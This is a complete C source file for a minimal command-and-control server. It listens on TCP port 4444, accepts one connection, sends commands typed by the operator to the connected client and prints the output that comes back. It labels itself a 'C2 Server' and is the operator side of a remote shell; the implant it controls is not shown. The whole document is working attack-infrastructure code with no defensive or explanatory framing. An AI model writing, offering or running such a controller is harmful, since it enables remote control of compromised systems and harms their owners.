#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h> // For timeouts

#define PORT 4444
#define BUFFER_SIZE 1024
#define TIMEOUT_SEC 10 // 10 seconds timeout

void handle_client(int new_socket) {
    char buffer[BUFFER_SIZE];
    char command[BUFFER_SIZE];
    ssize_t read_val;
    struct pollfd fds[2];
    int timeout_ms = TIMEOUT_SEC * 1000;

    printf("[*] Client connected. Waiting for commands...\n");

    while (1) {
        // Prepare file descriptors for polling
        // fd 0: stdin (user typing command)
        // fd 1: new_socket (client sending output)
        fds[0].fd = STDIN_FILENO;
        fds[0].events = POLLIN;
        fds[1].fd = new_socket;
        fds[1].events = POLLIN;

        // Wait for either user input or client data
        int ret = poll(fds, 2, timeout_ms);
        
        if (ret == 0) {
            printf("\n[*] Timeout waiting for input/output.\n");
            continue;
        } else if (ret < 0) {
            perror("Poll error");
            break;
        }

        // Check if client sent data
        if (fds[1].revents & POLLIN) {
            memset(command, 0, BUFFER_SIZE);
            read_val = read(new_socket, command, BUFFER_SIZE - 1);
            
            if (read_val <= 0) {
                printf("\n[*] Client disconnected.\n");
                break;
            }
            command[read_val] = '\0';
            
            // Remove trailing newline if present
            size_t len = strlen(command);
            if (len > 0 && command[len-1] == '\n') {
                command[len-1] = '\0';
            }

            printf("[*] Output:\n%s\n", command);
        }

        // Check if user typed a command
        if (fds[0].revents & POLLIN) {
            memset(buffer, 0, BUFFER_SIZE);
            read_val = read(STDIN_FILENO, buffer, BUFFER_SIZE - 1);
            
            if (read_val <= 0) {
                break;
            }
            buffer[read_val] = '\0';

            // Send command to client
            write(new_socket, buffer, strlen(buffer));
        }
    }

    close(new_socket);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    printf("[*] C2 Server listening on port %d...\n", PORT);
    printf("[*] Timeout set to %d seconds.\n", TIMEOUT_SEC);

    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
        perror("accept");
        exit(EXIT_FAILURE);
    }

    handle_client(new_socket);

    close(server_fd);
    return 0;
}
